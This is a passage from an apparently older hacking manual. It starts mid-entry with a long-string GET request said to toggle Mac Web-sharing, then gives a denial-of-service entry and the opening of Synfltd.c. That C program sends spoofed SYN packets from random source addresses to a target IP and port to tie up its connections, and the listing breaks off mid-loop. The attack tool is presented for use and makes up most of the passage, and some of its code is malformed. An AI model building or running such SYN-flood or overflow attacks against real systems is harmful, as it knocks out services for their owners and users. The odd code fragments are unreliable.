```
GET aaaa[... x4000... ]aaaaa HTTP/1.0
```

to Port 80, followed by pressing Return twice, toggles the Mac Web-sharing functions.

# Denial-of-Service Attack

**Synopsis:** Remote SYN attack that locks up all connections until reset internally.

**Hack State:** Severe congestion.

**Vulnerabilities:** All flavors.

**Breach:** *Synfltd.c*.

# Synfltd.c

```
#include <Inc Mods>
void dosynpacket(unsigned int, unsigned int, unsigned short, unsigned short);
unsigned short in_cksum(unsigned short *, int);
unsigned int host2ip(char *);
main(int argc, char **argv)
{
   unsigned int srchost;
   char tmpsrchost[12];
   int i,s1,s2,s3,s4;
   unsigned int dsthost;
   unsigned short port=80;
   unsigned short random_port;
   unsigned int number=1000;
   printf("synful [It's so synful to send those spoofed SYN's\n]");
   printf("Hacked out by \\\\StoRm\\\\\n");
   if(argc < 2)
   {
      printf("syntax: synful targetIP\n", argv[0]);
      exit(0);
   }
   srand();
   dsthost = host2ip(argv[1]);
   if(argc >= 3) port = atoi(argv[2]);
   if(argc >= 4) number = atoi(argv[3]);
   if(port == 0) port = 80;
   if(number == 0) number = 1000;
   printf("Destination  : %s\n",argv[1]);
   printf("Port     : %u\n",port);
   printf("NumberOfTimes: %d\n", number);
   for(i=0;i < number;i++)
   {
      s1 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));
      s2 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));
      s3 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));
      s4 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));
      random_port = 1+(int) (10000.0*rand()/(RAND_MAX+1.0));
      sprintf(tmpsrchost, "%d.%d.%d.%d", s1, s2, s3, s4);
```